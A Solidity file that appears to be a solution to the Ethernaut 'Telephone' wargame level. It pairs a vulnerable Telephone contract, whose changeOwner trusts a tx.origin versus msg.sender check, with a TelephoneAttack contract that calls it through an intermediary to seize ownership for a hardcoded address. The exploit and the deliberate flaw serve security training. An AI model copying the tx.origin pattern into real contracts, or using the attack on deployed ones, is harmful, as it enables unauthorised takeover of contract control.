
//0x77dE8a6618faC8AF24910edDaA8306c8606e8f85
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract TelephoneAttack {
    Telephone private immutable tel;

    constructor(address telAddress) {
        tel = Telephone(telAddress);
    }

    function attack() public {
        tel.changeOwner(0x5816F13d2DD3327bc6d815b49bE6804cF0E3EAC1);
    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}